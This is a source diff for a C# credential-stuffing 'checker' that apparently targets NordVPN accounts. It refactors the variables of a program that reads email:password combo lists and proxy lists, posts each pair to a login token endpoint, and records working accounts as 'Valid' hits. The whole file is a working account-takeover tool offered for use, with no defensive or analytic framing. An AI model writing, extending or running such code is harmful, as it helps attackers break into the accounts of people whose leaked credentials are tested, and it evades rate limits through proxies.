@@ -1,50 +1,48 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Threading.Tasks;
 using xNet;
 using ByteLib;
+using System.Windows.Forms.VisualStyles;
+using System.Runtime.CompilerServices;
 
-namespace exampleChecker
-{
+namespace exampleByteLib
+{    
     public class Program
     {
+        public static Variables var = new Variables();
+        public static data Combos = new data();
+
 
         [STAThread]
         static void Main(string[] args)
         {
-            Checker.Initialize("NordVPN", "1.0", "bnja#0606");
-            comboList = up.Combo();
-            proxyList = up.Proxys();
-            Threads = up.Threads();
-            proxyType = up.proxyType();
-            combolenght = comboList.Count;
-            Task.Factory.StartNew(delegate ()
-            {
-                for (; ; )
-                {
-                    checker.startTitle(Progress, combolenght, Hits, Fails, Retries);
-                }                
-            });            
+            // Format: (useProxy[true/false], nameChecker, coder, (string)versionChecker(optional))
+            nod.Config(new configuration(true, "NordVPN", "bnja#0606"));
+
+            // Inicialize program
+            Checker.Init();
 
             // Run checker
-            Checker.Start(startMethod);            
+            Checker.Start(startMethod);
             Console.ReadLine();
         }
+        
 
         public static void startMethod()
         {
-            for (;;)
+            for (; ; )
             {
                 try
                 {
-                    bool checkAll = comboList.Count - 1 <= Index;
+                    bool checkAll = Variables.ComboList.Count - 1 <= Variables.Index;
                     if (checkAll) break;
 
-                        Index++;
+                    Variables.Index++;
 
                     // This verifies that the list of combos contains email:pass
-                    bool Flag = comboList[Index].Split(new char[]
+                    bool Flag = Variables.ComboList[Variables.Index].Split(new char[]
                         {
                             ':'
                         }).Count<string>() == 2;
@@ -53,11 +51,11 @@ namespace exampleChecker
                     {
 
                         // This is to separate the email from the password
-                        string email = comboList[Index].Split(new char[]
+                        string email = Variables.ComboList[Variables.Index].Split(new char[]
                         {
                             ':'
                         })[0];
-                        string password = comboList[Index].Split(new char[]
+                        string password = Variables.ComboList[Variables.Index].Split(new char[]
                         {
                             ':'
                         })[1];
@@ -67,16 +65,16 @@ namespace exampleChecker
                         try
                         {
                             string data = "username=" + email + "&password=" + password;
-                            string response = Checker.post("https://zwyr157wwiu6eior.com/v1/users/tokens", proxyType,
-                                true, true, "application/x-www-form-urlencoded", data);
+                            string response = Checker.post("https://zwyr157wwiu6eior.com/v1/users/tokens", var.proxyType, true,
+                                "application/x-www-form-urlencoded", data);
 
                             if (response.Contains("token"))
                             {
                                 Console.ForegroundColor = ConsoleColor.Green;
                                 Console.WriteLine(" [Valid] " + acc);
                                 Checker.Increment_CPM++;
-                                Hits++;
-                                Progress++;
+                                Variables.Hits++;
+                                Variables.Progress++;
                                 Combos.Results(acc, "Valid");
                             }
                             else
@@ -84,47 +82,23 @@ namespace exampleChecker
                                 Console.ForegroundColor = ConsoleColor.Red;
                                 Console.WriteLine(" [Bad] " + acc);
                                 Checker.Increment_CPM++;
-                                Fails++;
-                                Progress++;
+                                Variables.Fails++;
+                                Variables.Progress++;
                             }
                         }
                         catch
                         {
                             Console.WriteLine(" [Retrie] " + acc);
-                            Retries++;
-                            Progress++;
+                            Variables.Retries++;
+                            Variables.Progress++;
+                            
                         }
                     }
                 }
-                catch 
+                catch
                 {
                 }
             }
         }
-
-
-        // num hits / fails etc
-        public static int Hits;
-        public static int Fails;
-        public static int Progress;
-        public static int Retries;
-
-
-        // Variables
-        public static int combolenght;
-        public static ProxyType proxyType;
-        public static int Threads;
-        public static int Index;
-        public static List<string> comboList;
-        public static List<string> proxyList;
-
-        // Calls to the Library (this is important)
-        public static Checker checker = new Checker();
-
-        // upload combos / proxys / threads / proxytype
-        public static Upload up = new Upload();
-
-        // Save result hits / fails
-        public static data Combos = new data();
     }
 }
